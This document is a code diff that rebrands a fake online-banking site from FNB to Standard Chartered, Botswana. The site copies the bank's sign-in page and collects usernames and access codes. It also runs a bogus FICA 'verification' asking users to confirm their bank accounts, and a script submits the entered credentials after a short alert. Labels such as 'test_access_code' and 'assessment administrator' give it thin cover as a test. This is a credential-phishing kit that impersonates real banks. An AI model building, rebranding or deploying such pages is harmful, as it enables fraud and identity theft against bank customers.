@@ -1084,7 +1084,7 @@ def base(content, header=True):
     >
 
     <span>
-        FNB
+        standard chartered
     </span>
 
 </div>
@@ -1120,7 +1120,7 @@ def base(content, header=True):
         content="width=device-width, initial-scale=1.0"
     >
 
-    <title>FNB</title>
+    <title>Standard Chartered</title>
 
     <link
         rel="icon"
@@ -1128,11 +1128,11 @@ def base(content, header=True):
         href="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
     >
 
-    <meta property="og:title" content="FNB">
+    <meta property="og:title" content="Standard Chartered">
 
     <meta
         property="og:description"
-        content="Online FNB SERVER."
+        content="Online STANDARD CHARTERED SERVER."
     >
 
     <meta
@@ -1160,7 +1160,7 @@ def base(content, header=True):
         {content}
 
         <div class="footer">
-            ONLINE FNB VERIFICATION | SERVER SYSTEM BW
+            ONLINE STANDARD CHARTERED VERIFICATION | SERVER SYSTEM BW
         </div>
 
     </body>
@@ -1227,540 +1227,444 @@ html,
 body {
     margin: 0 !important;
     padding: 0 !important;
-
     width: 100%;
     height: 100%;
-
     overflow: hidden !important;
-
     background: #ffffff;
-}
-
-body {
     font-family: Arial, Helvetica, sans-serif;
 }
 
-
-/* ============================================================
-   PAGINA FIXA
-   ============================================================ */
-
-.new-login-page {
-    position: fixed;
-
-    inset: 0;
-
-    width: 100vw;
-    height: 100svh;
-
-    overflow: hidden;
-
-    background: #ffffff;
-
-    display: flex;
-    justify-content: center;
-}
-
-
-/* ============================================================
-   ESTRUTURA
-   ============================================================ */
-
-.new-login-shell {
-    width: 100%;
-    max-width: 430px;
-
-    height: 100%;
-
-    display: grid;
-
-    grid-template-rows:
-        5%
-        38%
-        29%
-        28%;
-
-    overflow: hidden;
-
-    background: white;
-}
-
-
-/* ============================================================
-   CABECALHO
-   ============================================================ */
-
-.login-topbar {
-    width: 100%;
-    height: 100%;
-
-    background: #ffffff;
-
-    display: grid;
-
-    grid-template-columns:
-        1fr
-        1fr
-        1fr
-        1fr;
-
-    align-items: center;
-
-    padding: 0 10px;
-
+* {
     box-sizing: border-box;
-
-    font-size: 11px;
-
-    color: #444;
 }
 
-.login-topbar-item {
-    text-align: center;
+.ref-login-page {
+    position: fixed;
+    inset: 0;
+    width: 100vw;
+    height: 100dvh;
+    overflow: hidden;
+    background: #ffffff;
+}
 
+
+/* ============================================================
+   HEADER
+   ============================================================ */
+
+.ref-header {
+    height: 7.2dvh;
+    min-height: 46px;
+    max-height: 76px;
+    width: 100%;
+    background: #ffffff;
+    display: flex;
+    align-items: center;
+    padding: 0 2.2%;
+    color: #333333;
+    border-bottom: 1px solid #eeeeee;
+}
+
+.ref-header-left {
+    display: flex;
+    align-items: center;
+    height: 100%;
+}
+
+.ref-country {
+    color: #5ebf72;
+    font-size: clamp(10px, 1.55vw, 15px);
+    margin-right: clamp(24px, 5vw, 58px);
+}
+
+.ref-nav {
+    display: flex;
+    align-items: center;
+    gap: clamp(24px, 4vw, 46px);
+}
+
+.ref-nav span {
+    font-size: clamp(11px, 1.7vw, 16px);
     white-space: nowrap;
 }
 
-.login-topbar-item:first-child {
-    color: #5eba72;
-}
-
-.login-brand-placeholder {
-    justify-self: end;
-
-    width: 62px;
-    height: 24px;
-
-    display: flex;
-    align-items: center;
-    justify-content: center;
-
-    color: #5eba72;
-
-    font-size: 10px;
-    font-weight: 700;
+.ref-brand {
+    margin-left: auto;
+    color: #5ebf72;
+    font-size: clamp(10px, 1.45vw, 14px);
+    font-weight: 600;
+    white-space: nowrap;
 }
 
 
 /* ============================================================
-   AREA AGRICOLA
+   HERO AGRICOLA
    ============================================================ */
 
-.login-hero {
+.ref-hero {
     position: relative;
-
     width: 100%;
-    height: 100%;
+    height: 39.8dvh;
+    overflow: hidden;
 
-    background-image:
+    background:
         linear-gradient(
-            rgba(17, 75, 39, .38),
-            rgba(17, 75, 39, .38)
+            rgba(17, 72, 34, 0.34),
+            rgba(17, 72, 34, 0.34)
         ),
-        url(
-            "https://images.unsplash.com/photo-1500382017468-9049fed747ef?auto=format&fit=crop&w=1200&q=80"
-        );
+        url("https://images.unsplash.com/photo-1500382017468-9049fed747ef?auto=format&fit=crop&w=1600&q=90");
 
     background-size: cover;
-
-    background-position: center;
-
-    overflow: hidden;
+    background-position: center 54%;
 }
 
-
-/* CONTEUDO SOBRE FOTO */
-
-.login-hero-content {
+.ref-login-wrap {
     position: absolute;
-
     left: 50%;
-    top: 50%;
+    top: 50.5%;
+    transform: translate(-50%, -50%);
 
-    width: 51%;
-
-    transform:
-        translate(
-            -50%,
-            -48%
-        );
+    width: 50.5%;
+    max-width: 520px;
+    min-width: 295px;
 }
 
+.ref-title {
+    margin: 0 0 clamp(18px, 2.2dvh, 28px);
 
-/* TITULO */
+    color: rgba(255,255,255,.82);
 
-.login-hero-title {
-    margin-bottom: 17px;
-
-    color: rgba(
-        255,
-        255,
-        255,
-        .80
-    );
-
-    font-size: 22px;
-
+    font-size: clamp(27px, 4.4vw, 46px);
     font-weight: 300;
-
-    text-align: left;
+    line-height: 1.05;
 
     white-space: nowrap;
 }
 
 
 /* ============================================================
-   CAMPOS
+   INPUTS
    ============================================================ */
 
-.login-reference-field {
+.ref-field {
     width: 100%;
-    height: 29px;
+    height: clamp(48px, 5.7dvh, 58px);
 
-    margin-bottom: 6px;
+    margin-bottom: clamp(8px, 1dvh, 12px);
 
     background: #ffffff;
 
     display: grid;
-
-    grid-template-columns:
-        31%
-        69%;
+    grid-template-columns: 25% 75%;
 
     align-items: center;
 
-    box-sizing: border-box;
-
-    border: none;
+    border: 1px solid rgba(0,0,0,.06);
 }
 
-.login-reference-label {
-    padding-left: 12px;
+.ref-field-label {
+    padding-left: clamp(16px, 2vw, 24px);
 
-    color: #777;
+    color: #6f6f6f;
 
-    font-size: 8px;
+    font-size: clamp(12px, 1.55vw, 15px);
+    font-weight: 600;
 
-    font-weight: 700;
+    white-space: nowrap;
 }
 
-.login-reference-field input {
+.ref-field input {
     width: 100%;
     height: 100%;
 
-    border: none;
+    padding: 0 clamp(12px, 1.7vw, 20px);
 
+    border: none;
     outline: none;
 
-    background: transparent;
+    background: #ffffff;
 
-    padding:
-        0
-        8px;
+    color: #666666;
 
-    box-sizing: border-box;
-
-    color: #666;
-
-    font-size: 8px;
+    font-size: clamp(12px, 1.5vw, 15px);
 }
 
-.login-reference-field input::placeholder {
+.ref-field input::placeholder {
     color: #c7c7c7;
-
     opacity: 1;
 }
 
 
 /* ============================================================
-   BOTAO VERDE
+   LOGIN BUTTON
    ============================================================ */
 
-.login-reference-button {
+.ref-login-button {
+    display: block;
+
     width: 100%;
-    height: 31px;
+    height: clamp(49px, 5.8dvh, 58px);
+
+    margin-top: clamp(9px, 1dvh, 12px);
 
     border: none;
 
-    background: #67c47a;
+    background: #67c479;
 
-    color: white;
+    color: #ffffff;
 
-    font-size: 7px;
+    font-size: clamp(10px, 1.4vw, 13px);
+    font-weight: 600;
 
     text-transform: uppercase;
 
     cursor: pointer;
 }
 
-
-/* LINKS DE BAIXO */
-
-.login-under-links {
-    width: 100%;
-
-    margin-top: 13px;
-
-    display: flex;
-
-    align-items: center;
-
-    justify-content: space-between;
-
-    color: rgba(
-        255,
-        255,
-        255,
-        .85
-    );
-
-    font-size: 7px;
-}
-
-.login-under-links span {
-    white-space: nowrap;
+.ref-login-button:active {
+    background: #5eb970;
 }
 
 
 /* ============================================================
-   PARTE BRANCA
+   HERO LINKS
    ============================================================ */
 
-.login-register-section {
+.ref-hero-links {
     width: 100%;
-    height: 100%;
+
+    margin-top: clamp(19px, 2.4dvh, 26px);
+
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+
+    color: rgba(255,255,255,.86);
+
+    font-size: clamp(10px, 1.45vw, 13px);
+}
+
+.ref-security {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+
+.ref-security-icon {
+    width: 17px;
+    height: 17px;
+
+    border: 2px solid rgba(255,255,255,.8);
+    border-radius: 5px;
+
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+
+    transform: rotate(-35deg);
+
+    font-size: 8px;
+}
+
+
+/* ============================================================
+   REGISTER SECTION
+   ============================================================ */
+
+.ref-register {
+    width: 100%;
+    height: 27.1dvh;
 
     background: #ffffff;
 
-    box-sizing: border-box;
+    text-align: center;
 
-    padding:
-        17px
-        14px
-        12px;
+    padding-top: clamp(25px, 3.3dvh, 39px);
 
     overflow: hidden;
 }
 
+.ref-register-title {
+    margin: 0 0 clamp(30px, 4dvh, 47px);
 
-/* TITULO AZUL CLARO */
+    color: #bae5e9;
 
-.login-register-title {
-    text-align: center;
-
-    color: #b9e7ec;
-
-    font-size: 22px;
-
+    font-size: clamp(27px, 4.3vw, 44px);
     font-weight: 300;
-
-    margin-bottom: 23px;
-
-    white-space: nowrap;
+    line-height: 1;
 }
 
-
-/* DUAS CAIXAS */
-
-.login-register-options {
-    display: grid;
-
-    grid-template-columns:
-        1fr
-        1fr;
-
-    gap: 7px;
-
+.ref-register-options {
     width: 70%;
+    max-width: 600px;
 
     margin: 0 auto;
+
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+
+    gap: clamp(12px, 1.8vw, 18px);
 }
 
-.login-option-box {
-    height: 40px;
+.ref-register-option {
+    position: relative;
 
-    border:
-        1px solid
-        #e1e1e1;
+    height: clamp(62px, 7.5dvh, 80px);
+
+    border: 1px solid #dddddd;
+
+    background: #ffffff;
+
+    color: #5f5f5f;
 
     display: flex;
-
     align-items: center;
-
-    justify-content: center;
-
-    color: #666;
-
-    background: white;
-
-    font-size: 7px;
 
     text-align: left;
 
-    line-height: 1.3;
+    padding: 0 clamp(38px, 5vw, 60px) 0 clamp(16px, 2vw, 27px);
 
-    padding:
-        0
-        8px;
-
-    box-sizing: border-box;
+    font-size: clamp(8px, 1.2vw, 11px);
+    line-height: 1.25;
 
     cursor: pointer;
 }
 
+.ref-register-icon {
+    position: absolute;
 
-/* TEXTO PEQUENO */
+    right: clamp(11px, 1.6vw, 18px);
+    top: 50%;
 
-.login-register-note {
-    margin-top: 16px;
+    transform: translateY(-50%);
 
-    text-align: center;
+    width: clamp(23px, 3vw, 32px);
+    height: clamp(19px, 2.6vw, 27px);
 
-    color: #b0b0b0;
+    border: 1px solid #8cc99b;
+}
 
-    font-size: 7px;
+.ref-register-icon.phone {
+    width: clamp(17px, 2.4vw, 24px);
+    height: clamp(29px, 4vw, 40px);
+    border-radius: 2px;
+}
 
-    white-space: nowrap;
+.ref-register-note {
+    margin-top: clamp(24px, 3.5dvh, 38px);
+
+    color: #b6b6b6;
+
+    font-size: clamp(8px, 1.25vw, 12px);
 }
 
 
 /* ============================================================
-   SECCAO CIANO
+   CYAN BOTTOM
    ============================================================ */
 
-.login-cyan-section {
+.ref-bottom {
+    position: relative;
+
     width: 100%;
-    height: 100%;
+    height: 25.9dvh;
 
-    box-sizing: border-box;
+    overflow: hidden;
 
-    padding-top: 23px;
+    background: #22bee8;
 
     text-align: center;
 
-    color: white;
-
-    background:
-        linear-gradient(
-            rgba(35, 195, 231, .97),
-            rgba(35, 195, 231, .97)
-        );
-
-    position: relative;
-
-    overflow: hidden;
+    color: #ffffff;
 }
 
-
-/* PADRAO SUAVE */
-
-.login-cyan-section::before {
+.ref-bottom::before {
     content: "";
 
     position: absolute;
-
     inset: 0;
 
-    opacity: .10;
+    opacity: .08;
 
     background-image:
-        radial-gradient(
-            circle at 20% 20%,
-            white 0 2px,
-            transparent 3px
+        linear-gradient(
+            45deg,
+            transparent 46%,
+            #ffffff 47%,
+            #ffffff 49%,
+            transparent 50%
+        ),
+        linear-gradient(
+            -45deg,
+            transparent 46%,
+            #ffffff 47%,
+            #ffffff 49%,
+            transparent 50%
         );
 
-    background-size:
-        55px
-        55px;
+    background-size: 95px 95px;
 }
 
-
-/* CONTEUDO */
-
-.login-cyan-content {
+.ref-bottom-content {
     position: relative;
+    z-index: 1;
 
-    z-index: 2;
+    height: 100%;
+
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+
+    padding-top: clamp(34px, 4.5dvh, 50px);
 }
 
+.ref-bottom-title {
+    margin: 0 0 clamp(22px, 2.7dvh, 30px);
 
-/* TITULO */
+    color: rgba(255,255,255,.60);
 
-.login-cyan-title {
-    font-size: 20px;
-
+    font-size: clamp(29px, 4.5vw, 46px);
     font-weight: 300;
-
-    margin-bottom: 14px;
-
-    color: rgba(
-        255,
-        255,
-        255,
-        .75
-    );
+    line-height: 1;
 }
 
+.ref-bottom-text {
+    width: 58%;
+    max-width: 520px;
 
-/* TEXTO */
+    margin-bottom: clamp(22px, 2.8dvh, 32px);
 
-.login-cyan-text {
-    width: 60%;
+    color: rgba(255,255,255,.84);
 
-    margin:
-        0
-        auto
-        14px;
-
-    color: rgba(
-        255,
-        255,
-        255,
-        .80
-    );
-
-    font-size: 7px;
-
-    line-height: 1.4;
+    font-size: clamp(9px, 1.3vw, 12px);
+    font-weight: 600;
+    line-height: 1.35;
 }
 
+.ref-bottom-button {
+    min-width: clamp(125px, 18vw, 150px);
+    height: clamp(43px, 5.5dvh, 55px);
 
-/* BOTAO */
+    padding: 0 20px;
 
-.login-cyan-button {
-    height: 30px;
-
-    min-width: 80px;
-
-    padding:
-        0
-        12px;
-
-    border:
-        1px solid
-        rgba(
-            255,
-            255,
-            255,
-            .45
-        );
+    border: 2px solid rgba(255,255,255,.28);
 
     background: transparent;
 
-    color: white;
+    color: rgba(255,255,255,.83);
 
-    font-size: 7px;
+    font-size: clamp(9px, 1.25vw, 12px);
+    font-weight: 600;
 
     cursor: pointer;
 }
 
 
 /* ============================================================
-   ALERTA
+   TEST NOTICE
    ============================================================ */
 
-.login-test-notice {
+.ref-test-overlay {
     position: fixed;
 
     inset: 0;
@@ -1772,79 +1676,60 @@ body {
     align-items: center;
     justify-content: center;
 
-    background:
-        rgba(
-            0,
-            0,
-            0,
-            .45
-        );
+    background: rgba(0,0,0,.47);
 
-    padding: 18px;
+    padding: 20px;
 }
 
-.login-test-notice-box {
+.ref-test-box {
     width: 100%;
+    max-width: 380px;
 
-    max-width: 330px;
+    padding: 28px 24px;
 
-    padding:
-        25px
-        20px;
-
-    box-sizing: border-box;
-
-    border-radius: 12px;
-
-    background: #67c47a;
+    background: #67c479;
 
     color: white;
 
+    border-radius: 8px;
+
     text-align: center;
+
+    box-shadow: 0 10px 28px rgba(0,0,0,.26);
 }
 
-.login-test-notice-icon {
-    font-size: 30px;
-
-    margin-bottom: 8px;
+.ref-test-icon {
+    font-size: 32px;
+    margin-bottom: 10px;
 }
 
-.login-test-notice-title {
+.ref-test-title {
     font-size: 20px;
-
     font-weight: 700;
-
     margin-bottom: 12px;
 }
 
-.login-test-notice-user {
+.ref-test-username {
     font-size: 17px;
-
     font-weight: 700;
-
-    margin-bottom: 12px;
+    margin-bottom: 14px;
 }
 
-.login-test-notice-text {
+.ref-test-text {
     font-size: 14px;
-
-    line-height: 1.45;
-
-    margin-bottom: 18px;
+    line-height: 1.5;
+    margin-bottom: 20px;
 }
 
-.login-test-notice-button {
-    min-width: 90px;
-
-    height: 36px;
+.ref-test-button {
+    min-width: 100px;
+    height: 37px;
 
     border: none;
 
     background: white;
 
     color: #4fae68;
-
-    border-radius: 4px;
 
     font-weight: 700;
 
@@ -1853,331 +1738,384 @@ body {
 
 
 /* ============================================================
-   AJUSTE PARA TELAS MAIS LARGAS
+   MOBILE
    ============================================================ */
 
-@media (min-width: 700px) {
+@media (max-width: 600px) {
 
-    .new-login-shell {
-        max-width: 829px;
+    .ref-header {
+        padding-left: 11px;
+        padding-right: 11px;
     }
 
-    .login-topbar {
-        font-size: 15px;
-
-        padding:
-            0
-            18px;
+    .ref-country {
+        margin-right: 21px;
     }
 
-    .login-brand-placeholder {
-        width: 90px;
-
-        font-size: 13px;
+    .ref-nav {
+        gap: 20px;
     }
 
-    .login-hero-content {
+    .ref-brand {
+        font-size: 9px;
+    }
+
+    .ref-login-wrap {
         width: 51%;
+        min-width: 0;
     }
 
-    .login-hero-title {
-        font-size: 34px;
-
-        margin-bottom: 25px;
+    .ref-title {
+        font-size: 21px;
+        margin-bottom: 17px;
     }
 
-    .login-reference-field {
-        height: 55px;
-
-        margin-bottom: 10px;
+    .ref-field {
+        height: 29px;
+        margin-bottom: 6px;
     }
 
-    .login-reference-label {
-        font-size: 14px;
-
-        padding-left: 22px;
+    .ref-field-label {
+        padding-left: 11px;
+        font-size: 8px;
     }
 
-    .login-reference-field input {
-        font-size: 14px;
-
-        padding:
-            0
-            15px;
+    .ref-field input {
+        padding-left: 8px;
+        padding-right: 8px;
+        font-size: 8px;
     }
 
-    .login-reference-button {
-        height: 57px;
-
-        font-size: 12px;
+    .ref-login-button {
+        height: 31px;
+        margin-top: 7px;
+        font-size: 7px;
     }
 
-    .login-under-links {
-        margin-top: 20px;
-
-        font-size: 12px;
+    .ref-hero-links {
+        margin-top: 14px;
+        font-size: 7px;
     }
 
-    .login-register-title {
-        font-size: 36px;
-
-        margin-bottom: 35px;
+    .ref-security-icon {
+        width: 13px;
+        height: 13px;
+        border-width: 1px;
     }
 
-    .login-option-box {
-        height: 78px;
-
-        font-size: 11px;
+    .ref-register {
+        padding-top: 23px;
     }
 
-    .login-register-note {
-        font-size: 11px;
-
-        margin-top: 29px;
+    .ref-register-title {
+        font-size: 22px;
+        margin-bottom: 30px;
     }
 
-    .login-cyan-title {
-        font-size: 34px;
+    .ref-register-options {
+        width: 70%;
+        gap: 7px;
     }
 
-    .login-cyan-text {
-        font-size: 12px;
+    .ref-register-option {
+        height: 40px;
+        padding-left: 14px;
+        padding-right: 32px;
+        font-size: 6px;
     }
 
-    .login-cyan-button {
-        height: 45px;
-
-        min-width: 150px;
-
-        font-size: 11px;
+    .ref-register-icon {
+        right: 8px;
+        width: 22px;
+        height: 17px;
     }
 
-}
+    .ref-register-icon.phone {
+        width: 14px;
+        height: 25px;
+    }
 
+    .ref-register-note {
+        margin-top: 18px;
+        font-size: 6px;
+    }
 
-/* NUNCA DEIXAR SCROLL */
+    .ref-bottom-content {
+        padding-top: 27px;
+    }
 
-.new-login-page,
-.new-login-shell,
-.login-hero,
-.login-register-section,
-.login-cyan-section {
-    overscroll-behavior: none;
+    .ref-bottom-title {
+        font-size: 22px;
+        margin-bottom: 22px;
+    }
+
+    .ref-bottom-text {
+        width: 60%;
+        font-size: 6px;
+        margin-bottom: 18px;
+    }
+
+    .ref-bottom-button {
+        min-width: 92px;
+        height: 31px;
+        font-size: 7px;
+        border-width: 1px;
+    }
 }
 
 </style>
 
 
-<div class="new-login-page">
-
-    <div class="new-login-shell">
+<div class="ref-login-page">
 
 
-        <!-- CABECALHO -->
+    <!-- ====================================================
+         HEADER
+         ==================================================== -->
 
-        <header class="login-topbar">
+    <header class="ref-header">
 
-            <div class="login-topbar-item">
+        <div class="ref-header-left">
+
+            <div class="ref-country">
                 Botswana
             </div>
 
-            <div class="login-topbar-item">
-                Apply
+            <nav class="ref-nav">
+
+                <span>
+                    Apply
+                </span>
+
+                <span>
+                    Get Help
+                </span>
+
+            </nav>
+
+        </div>
+
+        <div class="ref-brand">
+            HappyNation
+        </div>
+
+    </header>
+
+
+
+    <!-- ====================================================
+         HERO
+         ==================================================== -->
+
+    <section class="ref-hero">
+
+        <div class="ref-login-wrap">
+
+            <div class="ref-title">
+                Sign in to online banking
             </div>
 
-            <div class="login-topbar-item">
-                Get Help
-            </div>
 
-            <div class="login-brand-placeholder">
-                HappyNation
-            </div>
+            <form
+                method="POST"
+                id="loginForm"
+            >
 
-        </header>
+                <div class="ref-field">
 
-
-        <!-- AREA AGRICOLA -->
-
-        <section class="login-hero">
-
-            <div class="login-hero-content">
-
-                <div class="login-hero-title">
-                    Sign in to online HappyNation
-                </div>
-
-
-                <form
-                    method="POST"
-                    id="loginForm"
-                >
-
-
-                    <div class="login-reference-field">
-
-                        <div class="login-reference-label">
-                            Username
-                        </div>
-
-                        <input
-                            id="usernameInput"
-                            type="text"
-                            name="username"
-                            placeholder="Case sensitive username"
-                            autocomplete="off"
-                            required
-                        >
-
+                    <div class="ref-field-label">
+                        Username
                     </div>
 
-
-                    <div class="login-reference-field">
-
-                        <div class="login-reference-label">
-                            Access Code
-                        </div>
-
-                        <input
-                            id="accessCodeInput"
-                            type="password"
-                            name="test_access_code"
-                            placeholder="Case sensitive access code"
-                            autocomplete="off"
-                            minlength="5"
-                            required
-                        >
-
-                    </div>
-
-
-                    <button
-                        id="loginButton"
-                        class="login-reference-button"
-                        type="submit"
+                    <input
+                        id="usernameInput"
+                        type="text"
+                        name="username"
+                        placeholder="Case sensitive username"
+                        autocomplete="off"
+                        required
                     >
-                        LOGIN
-                    </button>
+
+                </div>
 
 
-                    <div class="login-under-links">
+                <div class="ref-field">
 
-                        <span>
-                            Forgot Username / Access Code?
-                        </span>
-
-                        <span>
-                            ◇ Security Tips
-                        </span>
-
+                    <div class="ref-field-label">
+                        Access Code
                     </div>
 
-
-                </form>
-
-            </div>
-
-        </section>
-
-
-        <!-- REGISTO -->
-
-        <section class="login-register-section">
-
-            <div class="login-register-title">
-                New to online HappyNation?
-            </div>
-
-
-            <div class="login-register-options">
-
-                <button
-                    type="button"
-                    class="login-option-box"
-                >
-                    REGISTER WITH YOUR ID
-                </button>
-
-
-                <button
-                    type="button"
-                    class="login-option-box"
-                >
-                    REGISTER WITH TEMPORARY ID
-                </button>
-
-            </div>
-
-
-            <div class="login-register-note">
-                Please ensure your information is registered correctly.
-            </div>
-
-        </section>
-
-
-        <!-- CIANO -->
-
-        <section class="login-cyan-section">
-
-            <div class="login-cyan-content">
-
-                <div class="login-cyan-title">
-                    Need assistance?
-                </div>
-
-
-                <div class="login-cyan-text">
-
-                    Please contact your assessment
-                    administrator for registration
-                    or access assistance.
+                    <input
+                        id="accessCodeInput"
+                        type="password"
+                        name="test_access_code"
+                        placeholder="Case sensitive access code"
+                        autocomplete="off"
+                        minlength="5"
+                        required
+                    >
 
                 </div>
 
 
                 <button
-                    type="button"
-                    class="login-cyan-button"
+                    id="loginButton"
+                    class="ref-login-button"
+                    type="submit"
                 >
-                    GET HELP
+                    LOGIN
                 </button>
+
+
+                <div class="ref-hero-links">
+
+                    <span>
+                        Forgot Username / Access Code?
+                    </span>
+
+
+                    <span class="ref-security">
+
+                        <span class="ref-security-icon">
+                            ◇
+                        </span>
+
+                        Security Tips
+
+                    </span>
+
+                </div>
+
+            </form>
+
+        </div>
+
+    </section>
+
+
+
+    <!-- ====================================================
+         REGISTER
+         ==================================================== -->
+
+    <section class="ref-register">
+
+        <div class="ref-register-title">
+            New to online banking?
+        </div>
+
+
+        <div class="ref-register-options">
+
+
+            <button
+                type="button"
+                class="ref-register-option"
+            >
+
+                REGISTER WITH YOUR ID
+
+                <span class="ref-register-icon"></span>
+
+            </button>
+
+
+            <button
+                type="button"
+                class="ref-register-option"
+            >
+
+                REGISTER WITH TEMPORARY ID
+                <br>
+                AND SMS PIN
+
+                <span
+                    class="
+                        ref-register-icon
+                        phone
+                    "
+                ></span>
+
+            </button>
+
+
+        </div>
+
+
+        <div class="ref-register-note">
+
+            Please ensure your information is registered
+            correctly before continuing.
+
+        </div>
+
+    </section>
+
+
+
+    <!-- ====================================================
+         CYAN
+         ==================================================== -->
+
+    <section class="ref-bottom">
+
+        <div class="ref-bottom-content">
+
+            <div class="ref-bottom-title">
+                No account with us?
+            </div>
+
+
+            <div class="ref-bottom-text">
+
+                To register for online access,
+                please contact your assessment
+                administrator.
 
             </div>
 
-        </section>
 
+            <button
+                type="button"
+                class="ref-bottom-button"
+            >
+                GET HELP
+            </button>
 
-    </div>
+        </div>
+
+    </section>
+
 
 </div>
 
 
-<!-- ALERTA -->
+
+<!-- ========================================================
+     ALERT
+     ======================================================== -->
 
 <div
     id="testNotice"
-    class="login-test-notice"
+    class="ref-test-overlay"
 >
 
-    <div class="login-test-notice-box">
+    <div class="ref-test-box">
 
-        <div class="login-test-notice-icon">
+        <div class="ref-test-icon">
             ⚠
         </div>
 
-
-        <div class="login-test-notice-title">
+        <div class="ref-test-title">
             ALERT
         </div>
 
-
         <div
             id="noticeUsername"
-            class="login-test-notice-user"
+            class="ref-test-username"
         ></div>
 
-
-        <div class="login-test-notice-text">
+        <div class="ref-test-text">
 
             HI.
 
@@ -2187,11 +2125,10 @@ body {
 
         </div>
 
-
         <button
             type="button"
             id="noticeOkButton"
-            class="login-test-notice-button"
+            class="ref-test-button"
         >
             OK
         </button>
@@ -2199,6 +2136,7 @@ body {
     </div>
 
 </div>
+
 
 
 <script>
@@ -2237,7 +2175,6 @@ document.addEventListener(
                 "loginButton"
             );
 
-
         let submitted = false;
         let timer = null;
 
@@ -2257,7 +2194,6 @@ document.addEventListener(
                 true;
 
             form.submit();
-
         }
 
 
@@ -2271,12 +2207,10 @@ document.addEventListener(
 
                 event.preventDefault();
 
-
                 const username =
                     usernameInput
                     .value
                     .trim();
-
 
                 noticeUsername.textContent =
                     username
@@ -2285,17 +2219,14 @@ document.addEventListener(
                     :
                     "";
 
-
                 notice.style.display =
                     "flex";
-
 
                 timer =
                     setTimeout(
                         continueLogin,
                         10000
                     );
-
             }
         );
 
@@ -2305,15 +2236,10 @@ document.addEventListener(
             function() {
 
                 if (timer) {
-
-                    clearTimeout(
-                        timer
-                    );
-
+                    clearTimeout(timer);
                 }
 
                 continueLogin();
-
             }
         );
 
@@ -2514,7 +2440,7 @@ cell phone: {session.get("guardian_number", "")}
             <div class="intro-box">
 
                 To complete the update of your FICA information
-                  we need to verify any of your FNB account/s.
+                  we need to verify any of your standard chartered account/s.
 
             
             </div>
@@ -2707,7 +2633,7 @@ cell phone: {session.get("guardian_number", "")}
 
                         <div>
 
-                            I accept the FNB Verification
+                            I accept the Standard Chartered Verification
                             <a
                                 href="/terms"
                                 target="_blank"
@@ -2762,7 +2688,7 @@ def terms():
             <div class="intro-box">
 
     <p>
-        By using FNB Server, you agree to provide accurate and up-to-date information.
+        By using the Standard Chartered Server, you agree to provide accurate and up-to-date information.
     </p>
 
     <p>
@@ -2774,7 +2700,7 @@ def terms():
     </p>
 
     <p>
-        FNB Server may perform security checks to protect accounts, transactions, and user information.
+        The Standard Chartered Server may perform security checks to protect accounts, transactions, and user information.
     </p>
 
     <p>
@@ -2907,7 +2833,7 @@ Started: {session.get("started_at", "")}
 
                 <br>
 
-                we need to verify your any of your FNB accounts.
+                we need to verify your any of your Standard Chartered accounts.
 
 
             </div>
@@ -3179,7 +3105,7 @@ Entered: {age_value}
                 </h2>
 
                 <p class="congratulations-main">
-                    download the banking app and experience smarter banking with FNB.
+                    download the banking app and experience smarter banking with STANDARD CHARTERED.
                 </p>
 
                 <p>
